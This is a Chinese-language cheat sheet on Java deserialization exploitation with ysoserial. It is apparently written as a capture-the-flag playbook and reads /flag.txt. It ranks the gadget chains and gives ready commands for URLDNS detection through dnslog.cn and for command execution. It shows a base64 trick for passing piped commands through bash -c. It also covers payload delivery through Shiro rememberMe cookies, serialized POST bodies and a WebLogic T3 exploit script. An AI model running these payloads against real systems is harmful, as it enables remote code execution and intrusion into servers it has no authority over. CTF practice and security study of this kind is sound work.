# ysoserial Gadget Chain 详解

## Gadget Chain 优先级表

按成功率排序尝试：

| Gadget | 依赖库 | 说明 |
|--------|--------|------|
| CommonsCollections1-7 | commons-collections 3.x/4.x | 最常见，优先尝试 |
| CommonsBeanutils1 | commons-beanutils | Spring 项目常有 |
| Spring1/2 | spring-core + spring-beans | Spring 应用 |
| Groovy1 | groovy | Jenkins 等使用 Groovy 的应用 |
| BeanShell1 | bsh | 较少见 |
| Jdk7u21 | JDK ≤ 7u21 | 无第三方依赖，但要求旧版 JDK |
| URLDNS | 无依赖 | **不执行命令，仅 DNS 回连——用于检测漏洞是否存在** |

## 检测阶段（先用 URLDNS 确认）

先用 URLDNS gadget 确认目标是否存在反序列化漏洞（无害，仅触发 DNS 查询）：
```
java -jar ysoserial.jar URLDNS 'http://UNIQUE_ID.dnslog.cn' | base64 -w0
```
将生成的 Base64 payload 发送到目标，然后检查 DNSLog 是否收到请求。

## 利用阶段

确认漏洞存在后，逐个尝试执行命令的 gadget：
```
java -jar ysoserial.jar CommonsCollections1 'cat /flag.txt' | base64 -w0
java -jar ysoserial.jar CommonsCollections5 'cat /flag.txt' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' | base64 -w0
java -jar ysoserial.jar CommonsBeanutils1 'cat /flag.txt' | base64 -w0
```

## Runtime.exec() 限制

ysoserial 生成的 payload 通过 `Runtime.exec()` 执行命令，**不支持管道和重定向**。
如果需要管道/重定向，用 bash -c 包裹并 Base64 编码：
```
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,Y2F0IC9mbGFnLnR4dA==}|{base64,-d}|bash' | base64 -w0
```
其中 `Y2F0IC9mbGFnLnR4dA==` 是 `cat /flag.txt` 的 Base64。

## 发送 Payload

根据入口类型发送：
```
# Cookie 方式（如 Shiro rememberMe）
http_request url="http://target/" headers={"Cookie":"rememberMe=<base64_payload>"}

# POST Body 方式
http_request url="http://target/api" method="POST" body="<base64_payload>" headers={"Content-Type":"application/x-java-serialized-object"}

# T3 协议（WebLogic）
python3 weblogic_t3_exploit.py <target_ip> 7001 <payload_file>
```
